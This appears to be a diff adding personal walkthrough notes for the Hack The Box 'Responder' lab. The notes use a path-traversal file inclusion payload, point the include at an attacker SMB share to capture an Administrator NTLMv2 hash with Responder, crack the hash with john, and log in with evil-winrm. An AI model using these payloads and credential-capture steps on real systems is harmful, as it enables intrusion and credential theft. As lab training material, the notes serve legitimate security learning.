@@ -1,0 +1,21 @@
+responder box
+add unika.htb to /etc/hosts to stop redirect
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
+
+fire up responder
+sudo responder -I tun0
+on firefox-esr
+        http://unika.htb/index.php?page=//IP/somefile
+        where IP is our tun0 interface we are listening on
+responder gets
+[SMB] NTLMv2-SSP Client   : 10.129.118.110
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4a567307030548c6:9527B56516D198EB567D40B854FDE1B8:01010000000000008097409D4631DC0104D96FBC088521120000000002000800540058004800500001001E00570049004E002D004E0036004E004E00460050004600430042004900500004003400570049004E002D004E0036004E004E0046005000460043004200490050002E0054005800480050002E004C004F00430041004C000300140054005800480050002E004C004F00430041004C000500140054005800480050002E004C004F00430041004C00070008008097409D4631DC01060004000200000008003000300000000000000001000000002000003C47B904B01EEC317A7130536C2C173B9BD2159731468BDDA87820D61EF094220A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350037000000000000000000
+
+echo the Administrator::RESPONDER:4a56.... to a file
+john -w=/usr/share/wordlists/rockyou.txt responder.hash
+the above retrieves the PASSWORD
+
+use evil-winrm (a linux powershell equiv to get a login)
+evil-winrm -i 10.129.118.110 -u administrator -p PASSWORD
